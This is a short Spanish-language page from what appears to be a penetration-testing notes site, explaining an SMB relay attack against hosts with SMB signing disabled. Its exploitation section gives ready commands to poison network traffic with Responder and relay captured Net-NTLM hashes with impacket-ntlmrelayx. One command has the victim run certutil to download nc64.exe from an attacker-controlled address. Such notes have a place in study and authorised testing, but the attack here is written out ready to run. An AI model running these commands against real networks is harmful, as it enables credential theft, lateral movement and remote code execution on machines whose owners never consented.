---
description: SMB Signing -> False
---

# SMB Relay

### Descripción&#x20;

Este ataque consiste en capturar los hashes Net-NTLM de un cliente, reenviarlos a un segundo cliente, permitiendonos actuar como si fuesemos el primer cliente. Debido a que el primer cliente es un usuario administrador, podremos ejecutar comandos o ganar una shell en el segundo cliente.

Para poder hacer el relaying el cliente del que capturemos los hashes Net-NTLM deberá pertenecer al grupo local de administradores sobre el cual vamos a querer ejecutar comandos y que el SMB signing esté desactivado.

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

**/usr/share/responder/Responder.Conf:**

![](<../../../.gitbook/assets/image (27).png>)



### Explotación

Envenenar el tráfico con responder:

```bash
python Responder.py -I eth0 -dw 
```

Empezar el ataque con ntlmrelayx

<pre><code># con elbinario de impacket que viene en kali
impacket-ntlmrelayx -t (ip-target) -smb2support # el -smb2support es para versiones posteriores a WindowsServer 2008
<strong>impacket-ntlmrelayx -t 192.168.0.110 -smb2support
</strong>impacket-ntlmrelayx -tf targets.txt -smb2support

# ejecutar comandos
impacket-ntlmrelayx -t 192.168.0.110 -c "certutil.exe -f -urlcache -split http://192.168.0.108:9090/nc64.exe C:\\Windows\\Temp\\nc.exe" -smb2support

</code></pre>

Cliente 1 con privilegios de administrador en el cliente 2:

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

Hashes dumpeados con ntlmrelayx

<figure><img src="../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

